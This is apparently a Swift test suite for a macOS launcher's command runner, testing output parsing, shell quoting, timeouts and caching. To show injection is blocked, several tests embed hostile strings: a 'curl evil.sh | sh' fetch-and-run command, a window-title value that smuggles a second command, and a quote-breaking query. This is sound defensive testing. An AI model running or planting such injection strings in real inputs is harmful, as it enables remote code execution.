import AppKit
import Testing
@testable import KitsuneLauncher

// Subprocess-backed rows. Every command here is `printf`, `sleep` or a write into the
// test's own temp directory — nothing that touches the network, a package manager, or
// anything outside the directory the test removes afterwards.

@MainActor
private func fastSpec(_ mutate: (inout CommandSpec) -> Void = { _ in }) -> CommandSpec {
    var spec = CommandSpec()
    spec.debounce = 0        // the debounce has its own test; everywhere else it is noise
    spec.timeout = 5
    mutate(&spec)
    return spec
}

@MainActor
private func runCommand(_ runner: CommandRunner, _ command: String, query: String = "", wait: TimeInterval = 10) async -> [DisplayRow]? {
    let box = Locked<[DisplayRow]?>(nil)
    runner.rows(command: command, menuID: "menu", query: query) { box.value = $0 }
    _ = await kitsuneWaitUntil(timeout: wait) { box.value != nil }
    return box.value
}

// MARK: - Parsing

@Test func parsesTabSeparatedRows() {
    let rows = CommandRunner.parse("Alpha\tfirst\nBeta\tsecond\nGamma\n", menuID: "m", limit: 100)
    #expect(rows.map(\.label) == ["Alpha", "Beta", "Gamma"])
    #expect(rows[0].detail == "first")
    #expect(rows[1].detail == "second")

    // Without an `on_select` on the node there is nothing for a row to do.
    #expect(rows.allSatisfy { $0.action == nil })
    #expect(rows.allSatisfy { $0.kind == .notice })
}

@Test func parsesJSONLines() {
    let text = """
    {"label":"Repo","detail":"a repository","symbol":"folder"}
    {"label":"Run","value":"run"}
    """
    let rows = CommandRunner.parse(text, menuID: "m", limit: 100)
    #expect(rows.map(\.label) == ["Repo", "Run"])
    #expect(rows[0].symbol == "folder")
    // `value` names the row, which is what keeps its id stable as the query changes.
    #expect(rows[1].id == "m.cmd.run")
}

// MARK: - Output supplies text, the node supplies the action

@Test func outputCannotCarryAnActionOfItsOwn() {
    // The keys a row used to be able to name. A line of stdout is often not written by
    // the user — a window title is set by whatever page a browser has open — so an
    // action arriving here would be that page choosing what Return runs.
    let text = """
    {"label":"Safari","shell":"curl evil.sh | sh","applescript":"do shell script \\"id\\"","open":"/Applications","url":"https://x.example"}
    """
    let rows = CommandRunner.parse(text, menuID: "m", limit: 100)
    #expect(rows.count == 1)
    #expect(rows[0].action == nil)
    #expect(rows[0].kind == .notice)
}

@Test func tabSeparatedThirdFieldIsNotAnAction() {
    let rows = CommandRunner.parse("Alpha\tfirst\ttouch /tmp/pwned\n", menuID: "m", limit: 100)
    #expect(rows[0].action == nil)
}

@Test func onSelectIsResolvedAgainstEachRowsValue() {
    let text = """
    {"label":"Safari","value":"42"}
    {"label":"Mail","value":"7"}
    """
    let rows = CommandRunner.parse(text, menuID: "m", limit: 100,
                                   onSelect: .shell("focus --window-id {value}"))
    if case .shell(let command)? = rows[0].action { #expect(command == "focus --window-id '42'") } else { Issue.record("expected a shell action") }
    if case .shell(let command)? = rows[1].action { #expect(command == "focus --window-id '7'") } else { Issue.record("expected a shell action") }
    #expect(rows.allSatisfy { $0.kind == .action })
}

@Test func aValueIsQuotedIntoItsArgument() {
    // The confirmed-reachable case: a window title that splits its own record and
    // supplies a second command. Quoted, it is a window id that does not exist.
    let hostile = "99; curl -s evil.sh | sh; #"
    let rows = CommandRunner.parse("{\"label\":\"Safari\",\"value\":\"\(hostile)\"}", menuID: "m", limit: 100,
                                   onSelect: .shell("focus --window-id {value}"))
    guard case .shell(let command)? = rows[0].action else { Issue.record("expected a shell action"); return }
    #expect(command == "focus --window-id '99; curl -s evil.sh | sh; #'")
}

@Test func valueDefaultsToTheLabelSoTheTabFormStaysAOneLiner() {
    let rows = CommandRunner.parse("Safari\tbrowser\n", menuID: "m", limit: 100,
                                   onSelect: .shell("open -a {value}"))
    if case .shell(let command)? = rows[0].action { #expect(command == "open -a 'Safari'") } else { Issue.record("expected a shell action") }
}

@Test func aNoticeRowOptsOutOfTheAction() {
    let text = """
    {"label":"No rates for EUR","notice":true}
    {"label":"12.40","value":"12.40"}
    """
    let rows = CommandRunner.parse(text, menuID: "m", limit: 100,
                                   onSelect: .appleScript("set the clipboard to \"{value}\""))
    #expect(rows[0].action == nil)
    #expect(rows[0].kind == .notice)
    #expect(rows[1].action != nil)
}

@Test func onSelectAlsoSeesTheQuery() {
    let rows = CommandRunner.parse("Result\n", menuID: "m", limit: 100, query: "term",
                                   onSelect: .shell("note {query} {value}"))
    if case .shell(let command)? = rows[0].action { #expect(command == "note 'term' 'Result'") } else { Issue.record("expected a shell action") }
}

@Test func parsingSkipsBlanksAndCapsRows() {
    let rows = CommandRunner.parse("one\n\n   \ntwo\nthree\n", menuID: "m", limit: 2)
    #expect(rows.map(\.label) == ["one", "two"])
}

@Test func parsingKeepsTheCommandsOwnOrder() {
    // `brew search` and friends already rank their output; re-sorting would discard it.
    let rows = CommandRunner.parse("zebra\napple\nmango\n", menuID: "m", limit: 100)
    #expect(rows.map(\.label) == ["zebra", "apple", "mango"])
    #expect(rows.map(\.score) == [0, 1, 2])
}

@Test func duplicateLabelsGetDistinctIDs() {
    let rows = CommandRunner.parse("same\nsame\n", menuID: "m", limit: 100)
    #expect(rows[0].id != rows[1].id)
}

@Test func malformedJSONLineIsSkippedNotFatal() {
    let rows = CommandRunner.parse("{\"nope\":1}\nplain\n", menuID: "m", limit: 100)
    #expect(rows.map(\.label) == ["plain"])
}

// MARK: - Spawning

@MainActor
@Test func spawnsAndParsesRealOutput() async {
    let runner = CommandRunner()
    runner.spec = fastSpec()
    let rows = await runCommand(runner, "printf 'Alpha\\tfirst\\nBeta\\tsecond\\n'")
    #expect(rows?.map(\.label) == ["Alpha", "Beta"])
    #expect(rows?.first?.detail == "first")
}

@MainActor
@Test func queryIsSubstitutedAndShellQuoted() async {
    let directory = kitsuneTemporaryDirectory("kitsune-cmd-injection")
    defer { kitsuneRemove(directory) }
    let canary = directory.appendingPathComponent("pwned").path

    let runner = CommandRunner()
    runner.spec = fastSpec()
    // If {query} were interpolated raw, this would close the quote and run `touch`.
    let hostile = "a'; touch \(canary); echo 'b"
    let rows = await runCommand(runner, "printf '%s\\n' {query}", query: hostile)

    #expect(rows?.count == 1)
    #expect(rows?.first?.label == hostile)
    #expect(!FileManager.default.fileExists(atPath: canary))
}

@MainActor
@Test func aCommandThatOverstaysIsKilled() async {
    let runner = CommandRunner()
    runner.spec = fastSpec { $0.timeout = 0.3 }
    let started = Date()
    let rows = await runCommand(runner, "sleep 30; printf 'never\\n'", wait: 10)
    // It returns, empty, at roughly the deadline rather than hanging the list.
    #expect(rows?.isEmpty == true)
    #expect(Date().timeIntervalSince(started) < 8)
}

@MainActor
@Test func rowsAreCachedByResolvedCommand() async {
    let directory = kitsuneTemporaryDirectory("kitsune-cmd-cache")
    defer { kitsuneRemove(directory) }
    let ledger = directory.appendingPathComponent("runs").path

    let runner = CommandRunner()
    runner.spec = fastSpec()
    let command = "printf 'x' >> \(ledger); printf 'Row\\n'"

    #expect(await runCommand(runner, command)?.map(\.label) == ["Row"])
    #expect(await runCommand(runner, command)?.map(\.label) == ["Row"])

    // Two requests, one spawn: backspacing through a query must not respawn.
    let ledgerContents = (try? String(contentsOfFile: ledger, encoding: .utf8)) ?? ""
    #expect(ledgerContents == "x")
}

@MainActor
@Test func differentQueriesAreDifferentCacheEntries() async {
    let runner = CommandRunner()
    runner.spec = fastSpec()
    #expect(await runCommand(runner, "printf '%s\\n' {query}", query: "one")?.first?.label == "one")
    #expect(await runCommand(runner, "printf '%s\\n' {query}", query: "two")?.first?.label == "two")
}

@MainActor
@Test func cancelDropsAPendingRun() async {
    let runner = CommandRunner()
    runner.spec = fastSpec { $0.debounce = 0.5 }
    let box = Locked<[DisplayRow]?>(nil)
    runner.rows(command: "printf 'Row\\n'", menuID: "menu", query: "") { box.value = $0 }
    runner.cancel()
    // Long enough for the debounce to have elapsed twice over.
    _ = await kitsuneWaitUntil(timeout: 2) { box.value != nil }
    #expect(box.value == nil)
}

@MainActor
@Test func rowCapIsEnforcedOnRealOutput() async {
    let runner = CommandRunner()
    runner.spec = fastSpec { $0.maxRows = 5 }
    let rows = await runCommand(runner, "for i in 1 2 3 4 5 6 7 8 9 10; do printf 'row%s\\n' $i; done")
    #expect(rows?.count == 5)
}

// MARK: - Wiring

@MainActor
@Test func commandRowsFollowTheStaticRows() async {
    let controller = MenuController(appIndex: AppIndex(), runtime: LuaRuntime())
    controller.commands.spec = fastSpec()
    controller.nodes = [
        MenuNode(id: "root", parent: "", kind: .menu, label: "Go", detail: "", symbol: "", provider: nil, actionReference: nil, scriptAction: nil, order: 0),
        MenuNode(id: "search", parent: "root", kind: .menu, label: "Search", detail: "", symbol: "", provider: nil, command: "printf 'FromCommand\\n'", actionReference: nil, scriptAction: nil, order: 1),
        MenuNode(id: "search.static", parent: "search", kind: .action, label: "Static", detail: "", symbol: "", provider: nil, actionReference: nil, scriptAction: .url(""), order: 2),
    ]
    let labels = Locked<[String]>([])
    controller.onRows = { _, rows in labels.value = rows.map(\.label) }
    controller.open(route: "search")

    // The static list paints immediately; the command's rows arrive after it and are
    // appended, never replacing what was already there.
    #expect(labels.value == ["Back", "Static"])
    _ = await kitsuneWaitUntil(timeout: 10) { labels.value.contains("FromCommand") }
    #expect(labels.value == ["Back", "Static", "FromCommand"])
}

@MainActor
@Test func commandRowsCarryTheNodesOnSelect() async {
    let controller = MenuController(appIndex: AppIndex(), runtime: LuaRuntime())
    controller.commands.spec = fastSpec()
    controller.nodes = [
        MenuNode(id: "root", parent: "", kind: .menu, label: "Go", detail: "", symbol: "", provider: nil, actionReference: nil, scriptAction: nil, order: 0),
        MenuNode(id: "windows", parent: "root", kind: .menu, label: "Windows", detail: "", symbol: "", provider: nil,
                 command: "printf '{\"label\":\"Safari\",\"value\":\"42\"}\\n'",
                 onSelect: .shell("focus --window-id {value}"),
                 actionReference: nil, scriptAction: nil, order: 1),
    ]
    let rows = Locked<[DisplayRow]>([])
    controller.onRows = { _, emitted in rows.value = emitted }
    controller.open(route: "windows")
    _ = await kitsuneWaitUntil(timeout: 10) { rows.value.contains { $0.label == "Safari" } }

    // The row is what activation and the actions menu both read, so the node's
    // template has to arrive on it already resolved against the row's value.
    let row = rows.value.first { $0.label == "Safari" }
    if case .shell(let command)? = row?.action { #expect(command == "focus --window-id '42'") } else { Issue.record("expected a shell action") }
    #expect(RowActions.entries(for: row!, query: "").contains { $0.id == "kitsune.action.copy-shell" })
}

@MainActor
@Test func navigatingAwayCancelsTheCommand() async {
    let controller = MenuController(appIndex: AppIndex(), runtime: LuaRuntime())
    controller.commands.spec = fastSpec { $0.debounce = 0.4 }
    controller.nodes = [
        MenuNode(id: "root", parent: "", kind: .menu, label: "Go", detail: "", symbol: "", provider: nil, actionReference: nil, scriptAction: nil, order: 0),
        MenuNode(id: "search", parent: "root", kind: .menu, label: "Search", detail: "", symbol: "", provider: nil, command: "printf 'FromCommand\\n'", actionReference: nil, scriptAction: nil, order: 1),
    ]
    let labels = Locked<[String]>([])
    controller.onRows = { _, rows in labels.value = rows.map(\.label) }

    controller.open(route: "search")
    _ = controller.back()
    _ = await kitsuneWaitUntil(timeout: 2) { labels.value.contains("FromCommand") }
    // Root has no command, so the pending run is dropped rather than repainting a
    // menu the user already left.
    #expect(!labels.value.contains("FromCommand"))
}

@MainActor
@Test func reenteringACommandMenuRespawnsIt() async {
    let directory = kitsuneTemporaryDirectory("kitsune-cmd-reenter")
    defer { kitsuneRemove(directory) }
    let ledger = directory.appendingPathComponent("runs").path

    let controller = MenuController(appIndex: AppIndex(), runtime: LuaRuntime())
    controller.commands.spec = fastSpec()
    controller.nodes = [
        MenuNode(id: "root", parent: "", kind: .menu, label: "Go", detail: "", symbol: "", provider: nil, actionReference: nil, scriptAction: nil, order: 0),
        MenuNode(id: "windows", parent: "root", kind: .menu, label: "Windows", detail: "", symbol: "", provider: nil,
                 command: "printf 'x' >> \(ledger); printf 'Row\\n'", actionReference: nil, scriptAction: nil, order: 1),
    ]
    let labels = Locked<[String]>([])
    controller.onRows = { _, rows in labels.value = rows.map(\.label) }

    for _ in 0..<2 {
        controller.open(route: "windows")
        _ = await kitsuneWaitUntil(timeout: 10) { labels.value.contains("Row") }
        _ = controller.back()
    }

    // A command reports live state, so the answer cached on the way in is stale by the
    // time the user comes back: two visits, two spawns.
    let ledgerContents = (try? String(contentsOfFile: ledger, encoding: .utf8)) ?? ""
    #expect(ledgerContents == "xx")
}

@MainActor
@Test func asyncRowsSurviveTheNextKeystroke() async {
    let controller = MenuController(appIndex: AppIndex(), runtime: LuaRuntime())
    controller.commands.spec = fastSpec()
    controller.nodes = [
        MenuNode(id: "root", parent: "", kind: .menu, label: "Go", detail: "", symbol: "", provider: nil, actionReference: nil, scriptAction: nil, order: 0),
        MenuNode(id: "search", parent: "root", kind: .menu, label: "Search", detail: "", symbol: "", provider: nil,
                 command: "printf 'FromCommand-{query}\\n'", actionReference: nil, scriptAction: nil, order: 1),
        MenuNode(id: "search.static", parent: "search", kind: .action, label: "Static", detail: "", symbol: "", provider: nil, actionReference: nil, scriptAction: .url(""), order: 2),
    ]
    let emissions = Locked<[[String]]>([])
    controller.onRows = { _, rows in emissions.value.append(rows.map(\.label)) }

    controller.open(route: "search")
    _ = await kitsuneWaitUntil(timeout: 10) { emissions.value.last?.contains("FromCommand-") == true }

    // Every emission from here is a keystroke inside the same menu. The asynchronous
    // row must never drop out between the synchronous emission and the one carrying
    // its replacement: that collapse-and-regrow is two `update` passes per key, each a
    // reload, a resize and a selection reset, and it reads as a flicker.
    emissions.value = []
    controller.update(query: "s")
    controller.update(query: "st")
    _ = await kitsuneWaitUntil(timeout: 10) {
        emissions.value.last?.contains("FromCommand-st") == true
    }

    #expect(!emissions.value.isEmpty)
    #expect(emissions.value.allSatisfy { labels in labels.contains { $0.hasPrefix("FromCommand-") } })
}

@MainActor
@Test func leavingAMenuDropsItsAsyncRows() async {
    let controller = MenuController(appIndex: AppIndex(), runtime: LuaRuntime())
    controller.commands.spec = fastSpec()
    controller.nodes = [
        MenuNode(id: "root", parent: "", kind: .menu, label: "Go", detail: "", symbol: "", provider: nil, actionReference: nil, scriptAction: nil, order: 0),
        MenuNode(id: "search", parent: "root", kind: .menu, label: "Search", detail: "", symbol: "", provider: nil,
                 command: "printf 'FromCommand\\n'", actionReference: nil, scriptAction: nil, order: 1),
    ]
    let labels = Locked<[String]>([])
    controller.onRows = { _, rows in labels.value = rows.map(\.label) }

    controller.open(route: "search")
    _ = await kitsuneWaitUntil(timeout: 10) { labels.value.contains("FromCommand") }

    // Retention is scoped to the menu the rows describe. Going back has no replacement
    // coming, so they go immediately rather than lingering over somewhere else.
    _ = controller.back()
    #expect(!labels.value.contains("FromCommand"))
}
